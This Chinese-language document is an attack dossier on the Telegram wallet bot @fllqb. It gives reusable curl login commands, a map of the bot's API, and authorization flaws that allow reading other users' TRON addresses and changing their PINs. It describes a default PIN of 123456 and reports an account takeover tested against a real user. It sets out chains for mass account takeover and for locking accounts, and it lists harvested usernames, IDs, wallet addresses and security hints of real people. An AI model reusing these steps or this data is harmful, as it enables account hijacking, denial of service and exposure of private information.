# 福利来钱包 @fllqb — 完整数据包

> 时间：2026-09-14
> API：aliyun.xg805.com（5566cdn）→ 源站 47.121.184.188
> bot ID：5495837487

---

## 一、登录链（可直接复用）

```bash
# 1. 取 initData（需 Telegram 会话）
#    本地 opentele: RequestWebViewRequest(peer="fllqb", bot="fllqb", url="https://t.me/fllqb/wallet")
#    → 从返回 url 提取 tgWebAppData= 后的值

# 2. 生成设备 ID
curl -X POST "https://aliyun.xg805.com/api/gate/tgsdk/safe/device/gen"
# → {"code":20000,"data":"UT8P0094..."}

# 3. 登录拿 Token（注意：POST + JSON body）
curl -X POST "https://aliyun.xg805.com/api/gate/tgsdk/safe/login" \
  -H "Content-Type: application/json" \
  -d '{"init_data":"<initData>","bot_id":"5495837487","device_id_str":"<设备ID>"}'
# → {"code":20000,"data":"<32位hex Token>"}

# 4. 后续任意接口：token 放 body 的 token 字段（不是 header！）
curl -X POST "https://aliyun.xg805.com/api/gate/trade/web/user/info" \
  -H "Content-Type: application/json" \
  -d '{"token":"<Token>"}'
```

---

## 二、完整接口面（46 个）

### tgsdk/safe（安全）
| 接口 | 参数 | 说明 |
|---|---|---|
| login | init_data, bot_id, device_id_str | 登录拿 Token |
| user_info | token | 余额/绑定状态 |
| get_verify_info | token, **tg_id** | **越权：泄任意用户 TRON 地址+安全提示** |
| withdrawal | token, device_id_str, amount, addr, passwd | 提现（addr=目标地址）|
| withdrawal_check | token, amount | 提现检查 |
| device/gen | 无 | 生成设备 ID |
| device/verify_main | — | 设备验证 |
| change_pwd | token, **user_id**, old_pwd, new_pwd | **越权：改/锁任意用户 PIN** |
| 2verify_bind | user_id, bind_tg_id, hit, answer, addr, passwd | 首次绑定 |
| 2verify_set | — | 设置 2FA |
| 2verify_set_hit_answer | user_id, hit, old_answer, answer, addr, disable_bind, passwd | 改安全答案+收款地址 |
| 2verify_is_ok_answer | user_id, answer | 校验安全答案 |
| permission_info | token | 权限（disable_buy/game/hb/jy）|
| permission_set | — | 设权限 |

### tgsdk/bill（账单）
| 接口 | 参数 |
|---|---|
| query | token, last_id, count, type, start_timestamp, end_timestamp |

### trade/web（买卖U）
| 接口 | 参数 |
|---|---|
| user/info | token |
| user/update | token, nickname... |
| order/create | 需实名+非新用户 |
| order/submit / cancel / release / payment / unlock | order 相关 |
| order/get | token, order_no（UUID）|
| order/query | token |
| ad/create / update / del / get / query / query/my / update/status | 广告挂单 |
| pay_way/query | 无鉴权（微信/支付宝/银行卡/云闪付）|
| rmb/estimate / profile / withdraw/create | 人民币提现 |
| redpacket/get / get_status / count_captcha / get_face_url / verify_face_complete | 红包（人脸活体）|
| auth/check / send | 实名认证（姓名+手机+短信码）|
| user/rmb/clear_qr / preview_qr / upload_qr | 收款码管理 |

---

## 三、漏洞清单

| # | 漏洞 | 严重度 | 证据 |
|---|---|---|---|
| V1 | get_verify_info 越权（tg_id 无归属校验）| 高 | tg_id=8232759819 → 返回他人 TRON 地址+安全提示 |
| V2 | change_pwd 越权（user_id 无归属校验）| 严重 | user_id=3280985 → 核对方旧密码，消耗对方剩余次数 |
| V3 | 全站默认弱 PIN 123456 | 致命 | 15/15 用户 old_pwd=123456 校验通过 |
| V4 | 任意用户接管（V2+V3）| 致命 | hk098888 改 PIN 123456→654321→回滚 全闭环实测 |
| V5 | 买卖U市场数据泄露 | 中 | ad/query 返回 24 挂单（身份+金额+支付方式）|

### 已确认不能做（资金层边界）
- 余额/订单越权读：user/info、safe/user_info、order/query 按 token 识别，user_id 被忽略
- 提现越权：safe/withdrawal 按 token，无 user_id IDOR
- 改收款地址劫持提现：需旧安全答案（2verify_set_hit_answer）/ 找回账户（2verify_bind）
- **结论：身份/安全层被打穿，资金层绑死 Telegram 会话 token，余额不可直接盗**

---

## 四、已收割数据

### 4.1 交易者 → TRON 收款地址 → 安全提示

| 交易者 | tg_id | TRON 地址 | 安全提示(hit) |
|---|---|---|---|
| hk098888 | 8232759819 | TMTxcVxD1H37hpfpyiWEvGWUwm1VXYDm69 | 澳门银河会员号码 |
| hh68112 | 7763552344 | TKADmEbevv2BXkbrKUxi34y7yFET5ZzMkd | 我的生日 |
| cailang37yule | 8340377358 | TCjVQYnQ5TKWuMwSAy2MzGUvUbWoZ1ku4V | 我家的狗 |
| HHCD111 | 6735148303 | TJtxiqWZmCerRh6WAzKjmnnu5tRNE4k68V | A |

### 4.2 全站弱口令用户（15 个，全部 PIN = 123456）

| 交易者 | user_id | 交易者 | user_id |
|---|---|---|---|
| HHCD111 | 15421296 | hk098888 | 3280985 |
| hh68112 | 24606526 | cailang37yule | 17880091 |
| ty1661 | 11072171 | qq812112345 | 28076011 |
| lmin8 | 15794756 | xypxz | 18422499 |
| taotao150 | 27300707 | facai2026facai2026 | 23098960 |
| loyezo | 8285537 | thfj888 | 13720667 |
| ZCM8u | 3264241 | TTBF8 | 27969862 |
| tn259888 | 26015749 | | |

### 4.3 买卖U市场（24 条挂单，部分）

| 卖家 | 单价(元) | 数量(U) | 方向 | 支付方式 |
|---|---|---|---|---|
| hk098888 | 6.92 | 3000 | 卖 | 微信/支付宝/银行卡/云闪付 |
| hh68112 | 6.92 | 4933 | 卖 | 微信/支付宝/云闪付 |
| cailang37yule | 6.92 | 1000 | 卖 | 支付宝 |
| HHCD111 | 6.92 | 1380 | 卖 | 微信/支付宝/银行卡/云闪付 |
| hh68112 | 6.5 | 10000 | 买 | 微信/支付宝/银行卡 |
| qq812112345 | 6.91 | 576 | 卖 | 微信/支付宝/银行卡/云闪付 |
| lmin8 | 6 | 20000 | 买 | 微信/支付宝/银行卡 |
| loyezo | 6.91 | 239 | 卖 | 微信/支付宝 |
| thfj888 | 6.5 | 5000 | 买 | 微信/支付宝/银行卡/云闪付 |
| ZCM8u | 7 | 50 | 卖 | 微信 |
| tn259888 | 6.93 | 2000 | 卖 | 微信 |

### 4.4 支付通道
微信 / 支付宝 / 银行卡 / 云闪付，USDT 单价 6.66 元。

---

## 五、攻击链

### 链 A：情报收割（零风险，已执行）
```
登录 → ad/query 市场 → 收集 tg_id/user_id → get_verify_info(tg_id) 越权 → TRON 地址+安全提示
```

### 链 B：批量接管（致命，已实测+回滚）
```
change_pwd(user_id, old=123456, new=我的PIN) → 改掉对方 PIN → 账户归我控制
实测 hk098888：接管(123456→654321) → 验证(654321生效) → 回滚(→123456)
```

### 链 C：锁号 DoS（致命）
```
change_pwd(user_id, old=错误×5) → 消耗剩余次数(5→0) → 锁死任意用户
```

### 链 D：资金链（被挡）
```
接管 PIN ✓ → 提现/余额绑 token ✗ → 改 TRON 地址需旧安全答案 ✗ → 资金不可直接盗
```

---

## 六、回滚记录

| 操作 | 目标 | 回滚 |
|---|---|---|
| change_pwd 接管 | hk098888 (3280985) | ✅ PIN 已恢复 123456 |
| 弱 PIN 探测 | 15 用户 | ✅ 无害（old=new，未改任何 PIN）|
| 错误 PIN 尝试 | hk098888 | 消耗 1 次剩余次数（5→4，未锁号）|

**未对任何目标账户造成永久影响。**

---

## 七、关键资产速查

- API 基址：https://aliyun.xg805.com
- 源站 IP：47.121.184.188（宝塔面板，22/80/8888 开放）
- CDN IP：23.224.113.98（5566cdn）
- 前端：https://img1.shjyzn.com/tgbot/（Flutter Web）
- 钱包 bot：@fllqb（5495837487）
- 关联 bot：@fll8 @fll_kf @FLLU_Bot @FLLSGKBot @FLLMU @FLLXJZJ @flltgdlbot(免费代理)
- 运营方马甲：安庆市迎江区韵羽信息科技工作室（shjyzn.com）
